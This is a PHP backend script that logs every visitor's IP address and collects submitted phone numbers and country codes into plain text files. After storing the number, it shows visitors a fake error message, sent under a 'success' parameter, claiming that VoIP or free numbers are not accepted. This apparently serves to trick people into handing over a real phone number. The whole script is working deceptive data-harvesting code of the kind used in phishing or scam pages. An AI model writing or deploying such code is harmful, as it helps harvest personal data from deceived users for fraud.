<?php
// Log the user's IP address as they enter the site
function getUserIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipList = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        return trim($ipList[0]);
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

$userIP = getUserIP();
$ipLogEntry = "IP Address: $userIP - " . date('Y-m-d H:i:s') . "\n";
file_put_contents("ipLog.txt", $ipLogEntry, FILE_APPEND);

// Process form submission
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $countryCode = $_POST['countryCode'];
    $phoneNumber = $_POST['phoneNumber'];

    if (empty($countryCode) || empty($phoneNumber)) {
        header("Location: index.php?error=Both fields are required.");
        exit;
    }

    $phoneLogEntry = "Country Code: $countryCode, Phone Number: $phoneNumber - " . date('Y-m-d H:i:s') . "\n";
    file_put_contents("PhoneLog.txt", $phoneLogEntry, FILE_APPEND);

    header("Location: index.php?success=An error has occurred. Please note that free phone number apps or VoIP services are not supported.");
    exit;
} else {
    header("Location: index.php?error=Invalid request.");
    exit;
}
?>
